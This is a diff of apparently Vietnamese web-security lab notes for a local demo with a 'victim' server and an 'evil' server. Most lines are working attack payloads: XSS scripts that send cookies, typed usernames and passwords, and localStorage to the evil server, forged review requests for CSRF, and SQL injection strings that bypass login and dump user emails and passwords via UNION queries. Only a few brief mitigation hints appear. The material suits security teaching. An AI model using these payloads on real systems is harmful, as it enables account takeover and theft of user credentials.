@@ -1,12 +1,12 @@
 - victim server: index.js, port 3000
 - evil server: evil.js, port 4000
 
-- xss : 
+- XSS Cross Site Scripting 
 * Reflected XSS: Homepage, textbox name
 + Test
 <script>alert('xss')</script>
 + Hack: 
-* <script>let i = new Image(); i.src = "http://localhost:4000/getcookie?cookie=" + 		escape(document.cookie);</script>
+* <script>let i = new Image(); i.src = "http://localhost:4000/getcookie?cookie=" + escape(document.cookie);</script>
 * xem cookie tu trang chu evil server
 http://localhost:4000/
 
@@ -15,27 +15,46 @@ http://localhost:4000/
 <script>alert("xss")</script>
 + Hack: 
 * <script>let i = new Image(); i.src = "http://localhost:4000/getcookie?cookie=" + 		escape(document.cookie);</script>
+=> bao ve cookie: su dung httpOnly: true
 
 * <script>
     document.querySelector("#loginModal form").addEventListener("submit", function () {
         let username = document.getElementById("username").value;
         let password = document.getElementById("password").value;
         let img = new Image();
-        img.src = "http://localhost:4000/getcookie?cookie=" + escape(username + "-" + password);
+        img.src = "http://localhost:4000/getcookie?cookie=" + escape(`username=${username}; password=${password}`);
     });
 </script>
 
 * <script>let i = new Image(); i.src = "http://localhost:4000/getcookie?cookie=" + 		escape(JSON.stringify(localStorage));</script>
 
-- CSRF (nho doi gia tri id cua review thuc te)
-Demo CSRF <script>fetch("/reviews", {
-    method: "DELETE", 
+* (nho doi gia tri id cua review thuc te) 
+<script>fetch("/reviews", {
+    method: "POST", 
     headers: {
       "Content-Type": "application/json", 
     },
     body: JSON.stringify({ id: 2}), 
   });
 </script>
+
+- CSRF Cross-Site Request Forgery  
+IMPORTANT: Remember that Cross-Site Scripting (XSS) can defeat all CSRF mitigation techniques!
++ Post Review
+Login
+Go to Evil site => Click 'Hello, this is a message from evil'
+A new review inserted
+Note: Lay id cua product thuc te va sua trong file index.html cua evil
+=> Su dung csrf, cors
+
++ Delete Review
+Login as administrator
+Add new review
+Go to Evil site => Click 'See more'
+Review is deleted
+Note: Lay id cua review thuc te va sua trong file index.html cua evil
+=> Su dung csrf token, cors, ko dung get method
+
 
 - sql injection: Login, Products
 + Test: textbox: '
@@ -48,12 +67,11 @@ username & password: ' or ''='
 # Lay ten tat ca tables co trong csdl
  UNION SELECT ALL 1,array_to_string(array_agg(table_name),','),0,'https://dummyimage.com/150' FROM information_schema.tables
 # Lay ten tat ca columns co trong bang Users
- UNION SELECT ALL 1,array_to_string(array_agg(column_name),','),0,'https://dummyimage.com/150' FROM information_schema.
- columns WHERE table_schema = 'public' AND table_name = 'Users'
+ UNION SELECT ALL 1,array_to_string(array_agg(column_name),','),0,'https://dummyimage.com/150' FROM information_schema.columns WHERE table_schema = 'public' AND table_name = 'Users'
 # Lay du lieu email va password trong bang Users
  UNION SELECT ALL 1,concat(email, ' - ', password), 0,'https://dummyimage.com/150' FROM public."Users"
 # Lay du lieu email va password trong bang Users co isAdmin la trues
  UNION SELECT ALL 1,concat(email, ' - ', password), 0,'https://dummyimage.com/150' FROM public."Users" WHERE "isAdmin"=true
 
-+ Insert Review
++ Product details => textbox Review
 ' || (SELECT concat(array_to_string(array_agg(email),','), ';', array_to_string(array_agg(password),',')) FROM public."Users") || '
